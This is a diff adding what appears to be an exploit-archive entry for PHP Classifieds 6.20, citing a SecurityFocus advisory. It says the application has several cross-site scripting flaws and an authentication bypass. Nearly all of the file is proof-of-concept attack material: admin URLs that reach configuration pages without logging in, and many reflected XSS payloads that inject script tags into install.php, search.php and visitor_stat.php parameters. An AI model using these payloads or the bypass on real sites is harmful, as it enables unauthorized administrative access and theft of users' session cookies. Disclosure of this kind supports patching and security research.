@@ -1,0 +1,60 @@
+source: http://www.securityfocus.com/bid/28521/info
+
+PHP Classifieds is prone to multiple cross-site scripting vulnerabilities and an authentication-bypass vulnerability.
+
+An attacker may leverage these issues to gain unauthorized access to the affected application and execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+PHP Classifieds 6.20 is vulnerable; other versions may also be affected.
+
+admin bypass
+
+http://localhost/classifieds/admin   ( admin menu )
+
+http://localhost/classifieds/admin/set.php?file_name=config/general.inc.php  ( general setup )
+
+http://localhost/classifieds/admin/set.php?file_name=config/options.inc.php  ( options )
+
+http://localhost/classifieds/admin/set.php?file_name=config/globaluser.inc.php ( Global user fields  )
+
+http://localhost/classifieds/admin/set.php?file_name=config/credits.inc.php ( credits )
+
+http://localhost/classifieds/admin/set.php?file_name=config/pay.inc.php ( payments )
+
+classified XSS
+
+http://localhost/classifieds/admin/visitor_stat.php?order_by=page&dir=asc&mo=&yr="><script>alert("CANAKKALE-GECiLMEZ")</script>
+
+http://localhost/classifieds/search.php?do_search=Search&searchword="><script>alert("CANAKKALE-GECiLMEZ")</script>
+
+http://localhost/classifieds/install.php?level=3&q_tbl="><script>alert("CANAKKALE-GECiLMEZ")</script>&fav_tbl=favourites&stat_tbl=stat&template_tbl=templ
+ate&adv_tbl=advertisers&banner_tbl=banners&payment_tbl=payment&usr_tbl=user&ads_tbl=ad&cat_tbl=category&pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&q_tbl=questions&fav_tbl="><script>alert("CANAKKALE-GECiLMEZ")</script>&stat_tbl=stat&template_tbl=templa
+te&adv_tbl=advertisers&banner_tbl=banners&payment_tbl=payment&usr_tbl=user&ads_tbl=ad&cat_tbl=category&pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&q_tbl=questions&fav_tbl=favourites&stat_tbl="><script>alert("CANAKKALE-GECiLMEZ")</script>&template_tbl=
+template&adv_tbl=advertisers&banner_tbl=banners&payment_tbl=payment&usr_tbl=user&ads_tbl=ad&cat_tbl=category&pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&q_tbl=questions&fav_tbl=favourites&stat_tbl=stat&template_tbl="><script>alert("CANAKKALE-GECiLMEZ")</scr
+ipt>&adv_tbl=advertisers&banner_tbl=banners&payment_tbl=payment&usr_tbl=user&ads_tbl=ad&cat_tbl=category&pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&q_tbl=questions&fav_tbl=favourites&stat_tbl=stat&template_tbl=template&adv_tbl="><script>alert("CANAKKAL
+E-GECiLMEZ")</script>&banner_tbl=banners&payment_tbl=payment&usr_tbl=user&ads_tbl=ad&cat_tbl=category&pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&q_tbl=questions&fav_tbl=favourites&stat_tbl=stat&template_tbl=template&adv_tbl=advertisers&banner_tbl=">
+<script>alert("CANAKKALE-GECiLMEZ")</script>&payment_tbl=payment&usr_tbl=user&ads_tbl=ad&cat_tbl=category&pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&q_tbl=questions&fav_tbl=favourites&stat_tbl=stat&template_tbl=template&adv_tbl=advertisers&banner_tbl=ba
+nners&payment_tbl="><script>alert("CANAKKALE-GECiLMEZ")</script>&usr_tbl=user&ads_tbl=ad&cat_tbl=category&pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&q_tbl=questions&fav_tbl=favourites&stat_tbl=stat&template_tbl=template&adv_tbl=advertisers&banner_tbl=ba
+nners&payment_tbl=payment&usr_tbl="><script>alert("CANAKKALE-GECiLMEZ")</script>&ads_tbl=ad&cat_tbl=category&pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&q_tbl=questions&fav_tbl=favourites&stat_tbl=stat&template_tbl=template&adv_tbl=advertisers&banner_tbl=ba
+nners&payment_tbl=payment&usr_tbl=user&ads_tbl="><script>alert("CANAKKALE-GECiLMEZ")</script>&cat_tbl=category&pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&q_tbl=questions&fav_tbl=favourites&stat_tbl=stat&template_tbl=template&adv_tbl=advertisers&banner_tbl=ba
+nners&payment_tbl=payment&usr_tbl=user&ads_tbl=ad&cat_tbl="><script>alert("CANAKKALE-GECiLMEZ")</script>&pic_tbl=picture
+
+http://localhost/classifieds/install.php?level=3&q_tbl=questions&fav_tbl=favourites&stat_tbl=stat&template_tbl=template&adv_tbl=advertisers&banner_tbl=ba
+nners&payment_tbl=payment&usr_tbl=user&ads_tbl=ad&cat_tbl=category&pic_tbl="><script>alert("CANAKKALE-GECiLMEZ")</script>
